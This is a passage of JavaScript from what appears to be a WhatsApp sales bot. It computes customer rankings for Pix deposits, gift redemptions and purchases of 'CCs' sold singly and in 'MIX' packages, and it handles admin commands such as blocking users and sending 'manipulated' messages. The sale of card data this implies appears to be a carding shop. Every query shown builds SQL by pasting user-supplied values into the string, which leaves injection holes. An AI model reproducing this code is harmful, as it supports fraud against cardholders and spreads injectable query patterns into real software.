                    console.log("passou")
                    Total_Indicados = Total_Indicados.length
                    Array_Dados.push([CONTATOS[index]["ID_CONTATO"], Total_Indicados]);
                    console.log(CONTATOS[index]["ID_CONTATO"], Total_Indicados)
                }
                // console.log(Array_Dados)
                // console.log("Fim")
                Array_Dados.sort((a, b) => a[1] - b[1]);
                Array_Dados.reverse();
                // console.log(Array_Dados)
                RANKING_INDICACOES = Array_Dados.findIndex(x => x.includes(NUMERO))
                // console.log(RANKING_INDICACOES)
                if (RANKING_INDICACOES === -1) {
                    RANKING_INDICACOES = "Não indicou ainda."
                } else {
                    RANKING_INDICACOES = parseInt(RANKING_INDICACOES) + 1
                }
                //console.log(RANKING_INDICACOES)
            });

            //console.log("esperando")
            await delay(2000)
            //console.log("passou")

            PIXINSERIDOS = await DataBase_Better.prepare(`SELECT SUM(VALOR) FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${NUMERO}'`).get()["SUM(VALOR)"]
            PIXINSERIDOS = parseFloat(PIXINSERIDOS).toFixed(2);
            if (PIXINSERIDOS === "NaN") {
                PIXINSERIDOS = "Não inseriu Pix ainda."
            }

            MAIORPIX = await DataBase_Better.prepare(`SELECT MAX(CAST(VALOR as INT)) FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${NUMERO}'`).get()["MAX(CAST(VALOR as INT))"]
            MAIORPIX = parseFloat(MAIORPIX).toFixed(2);
            if (MAIORPIX === "NaN") {
                MAIORPIX = "Não inseriu Pix ainda."
            }

            CONTATOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS`).all()
            db = new sqlite3.Database(Diretorio_SQLITE_Principal);
            db.serialize(async function () {
                db.run("begin transaction");
                Array_Dados = []
                for (var index = 0; index < CONTATOS.length; index++) {
                    Total_Pix = await DataBase_Better.prepare(`SELECT SUM(VALOR) FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${CONTATOS[index]["ID_CONTATO"]}' AND PROCESSADO = '1'`).get()["SUM(VALOR)"]
                    if (Total_Pix === null) {
                        continue
                    }
                    Array_Dados.push([CONTATOS[index]["ID_CONTATO"], Total_Pix]);
                    //console.log(CONTATOS[index]["ID_CONTATO"], Total_Pix)
                }
                // console.log("Fim")
                Array_Dados.sort((a, b) => a[1] - b[1]);
                Array_Dados.reverse();
                //console.log(Array_Dados)
                RANKING_PIX_INSERIDO = Array_Dados.findIndex(x => x.includes(NUMERO))
                if (RANKING_PIX_INSERIDO === -1) {
                    RANKING_PIX_INSERIDO = "Não inseriu Pix ainda."
                } else {
                    RANKING_PIX_INSERIDO = parseInt(RANKING_PIX_INSERIDO) + 1
                }
                //console.log(RANKING_PIX_INSERIDO)
            });

            //console.log("esperando")
            await delay(2000)
            //console.log("passou")

            GIFTS_RESGATADOS = await DataBase_Better.prepare(`SELECT SUM(VALOR) FROM GIFTS WHERE USADO = 1 AND NUMERO_QUE_USOU = '${NUMERO}'`).get()["SUM(VALOR)"]
            GIFTS_RESGATADOS = parseFloat(GIFTS_RESGATADOS).toFixed(2);
            MAIORGIFT = await DataBase_Better.prepare(`SELECT MAX(CAST(VALOR as INT)) FROM GIFTS WHERE USADO = 1 AND NUMERO_QUE_USOU = '${NUMERO}'`).get()["MAX(CAST(VALOR as INT))"]
            MAIORGIFT = parseFloat(MAIORGIFT).toFixed(2);
            if (MAIORGIFT === "NaN") {
                MAIORGIFT = "Não resgatou gift ainda."
            }

            TOTAL_CCS_UNITARIAS_COMPRADAS = await DataBase_Better.prepare(`SELECT NUMERO_COMPRADOR FROM CCs_Vendidas WHERE NUMERO_COMPRADOR = '${NUMERO}'`).all()//length
            TOTAL_CCS_COMPRADAS_NO_MIX = await DataBase_Better.prepare(`SELECT MAX(CAST(QUANTIDADE as INT)) FROM MIX_VENDIDOS WHERE COMPRADOR = '${NUMERO}'`).get()["MAX(CAST(QUANTIDADE as INT))"]
            TOTAL_CCS_COMPRADAS_GERAL = parseInt(TOTAL_CCS_UNITARIAS_COMPRADAS.length) + parseInt(TOTAL_CCS_COMPRADAS_NO_MIX)
            if (TOTAL_CCS_COMPRADAS_GERAL === "NaN" || TOTAL_CCS_COMPRADAS_NO_MIX === null) {
                TOTAL_CCS_COMPRADAS_GERAL = "Não comprou nada ainda."
            }

            TOTAL_MIX_COMPRADOS = await DataBase_Better.prepare(`SELECT COMPRADOR FROM MIX_VENDIDOS WHERE COMPRADOR = '${NUMERO}'`).all()//length

            CONTATOS = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS`).all()
            db = new sqlite3.Database(Diretorio_SQLITE_Principal);
            db.serialize(async function () {
                db.run("begin transaction");
                Array_Dados = []
                for (var index = 0; index < CONTATOS.length; index++) {

                    TOTAL_CCS_UNITARIAS_COMPRADAS_loop = await DataBase_Better.prepare(`SELECT NUMERO_COMPRADOR FROM CCs_Vendidas WHERE NUMERO_COMPRADOR = '${CONTATOS[index]["ID_CONTATO"]}'`).all()//length
                    TOTAL_CCS_COMPRADAS_NO_MIX_loop = await DataBase_Better.prepare(`SELECT SUM(QUANTIDADE) FROM MIX_VENDIDOS WHERE COMPRADOR = '${CONTATOS[index]["ID_CONTATO"]}'`).get()["SUM(QUANTIDADE)"]
                    if (TOTAL_CCS_UNITARIAS_COMPRADAS_loop.length === 0 && TOTAL_CCS_COMPRADAS_NO_MIX_loop === null) {
                        continue
                    }
                    if (TOTAL_CCS_COMPRADAS_NO_MIX_loop === null) {
                        TOTAL_CCS_COMPRADAS_NO_MIX_loop = 0
                    }
                    TOTAL_CCS_COMPRADAS_GERAL_loop = parseInt(TOTAL_CCS_UNITARIAS_COMPRADAS_loop.length) + parseInt(TOTAL_CCS_COMPRADAS_NO_MIX_loop)
                    //console.log(TOTAL_CCS_UNITARIAS_COMPRADAS_loop.length,TOTAL_CCS_COMPRADAS_NO_MIX_loop,TOTAL_CCS_COMPRADAS_GERAL_loop)

                    Array_Dados.push([CONTATOS[index]["ID_CONTATO"], TOTAL_CCS_COMPRADAS_GERAL_loop])
                    //console.log([CONTATOS[index]["ID_CONTATO"],TOTAL_CCS_COMPRADAS_GERAL_loop])
                }
                // console.log("Fim")
                Array_Dados.sort((a, b) => a[1] - b[1]);
                Array_Dados.reverse();
                //console.log(Array_Dados)
                RANKING_CCS_COMPRADAS_UNI_MIX = Array_Dados.findIndex(x => x.includes(NUMERO))
                if (RANKING_CCS_COMPRADAS_UNI_MIX === -1) {
                    RANKING_CCS_COMPRADAS_UNI_MIX = "Não comprou nada ainda."
                } else {
                    RANKING_CCS_COMPRADAS_UNI_MIX = parseInt(RANKING_CCS_COMPRADAS_UNI_MIX) + 1
                }
                console.log(RANKING_CCS_COMPRADAS_UNI_MIX)
            });

            //console.log("esperando")
            await delay(2000)
            //console.log("passou")

            Texto = `*INFORMAÇÕES SOBRE: wa.me/${NUMERO_normal}*

*DATA DE REGISTRO:* ${DATA_MS_INSERIDO}

*SALDO ATUAL:* ${SALDO_USUARIO}

*NÚMERO INDICADOR:* ${NUMERO_INDICADOR}

*TOTAL DE INDICADOS:* ${TOTAL_INDICADOS.length}
*TOTAL DE BÔNUS RECEBIDO POR INDICAR:* ${BONUS_INDICACAO}
*TOP* ${RANKING_INDICACOES} *EM INDICAR PESSOAS*

*TOTAL DE PIX INSERIDOS:* ${PIXINSERIDOS}
*MAIOR PIX INSERIDO:* ${MAIORPIX}
*TOP* ${RANKING_PIX_INSERIDO} *EM INSERIR PIX*

*TOTAL DE GIFTS RESGATADOS:* ${SALDO_USUARIO}
*MAIOR GIFT RESGATADO:* ${MAIORGIFT}

*TOTAL CCs UNIDADE COMPRADAS:* ${TOTAL_CCS_UNITARIAS_COMPRADAS.length}
*TOTAL DE PACOTES MIX COMPRADOS:* ${TOTAL_MIX_COMPRADOS.length}
*TOTAL CCs COMPRADAS EM PACOTE MIX:* ${TOTAL_CCS_UNITARIAS_COMPRADAS.length}
*TOTAL DE CCs SOMANDO UNIDADE E MIX:* ${TOTAL_CCS_COMPRADAS_GERAL}
*TOP* ${RANKING_CCS_COMPRADAS_UNI_MIX} *DOS QUE MAIS COMPRAM CCs*
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/bloquear===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 6) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            USUARIO = msg[1]
            BLOQUEIO = msg[2]
            if (BLOQUEIO === "0") {
                Texto = `Usuário permitido.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET BLOQUEADO = '0' WHERE ID_CONTATO = '${USUARIO}@c.us'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (BLOQUEIO === "1") {
                Texto = `Usuário bloqueado.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET BLOQUEADO = '1' WHERE ID_CONTATO = '${USUARIO}@c.us'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/inserirgruponotificar===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Texto = `*GRUPO INSERIDO NA LISTA DE GRUPOS A NOTIFICAR*

*ID GRUPO:* ${msg[1]}`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            await DataBase_Better.prepare(`INSERT INTO GRUPOS_NOTIFICAR (ID_GRUPO) VALUES ('${msg[1]}') ON CONFLICT DO NOTHING`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deletargruponotificar===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Texto = `*GRUPO DELETADO DA LISTA DE GRUPOS A NOTIFICAR*

*ID GRUPO:* ${msg[1]}`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            await DataBase_Better.prepare(`DELETE FROM GRUPOS_NOTIFICAR WHERE ID_GRUPO = '${msg[1]}'`).run();
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Texto).toString().toLowerCase().indexOf("/msn===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                GRUPO = msg[1]
                MENSAGEM = msg[2]
                console.log(`Msg Manipulada: ${Mensagem_From} | ${GRUPO} |${MENSAGEM}`)

                if (GRUPO === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                if (MENSAGEM === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${MENSAGEM}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`INSERT INTO MSNMANIPULADAS (ID_CONTATO,MENSAGEM,ID_MENSAGEM,DATAMS) VALUES ('${Mensagem_From}','${Mensagem_Texto}','${result.id}','${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(error)
                Texto = `Comando inválido ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/elogiar===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
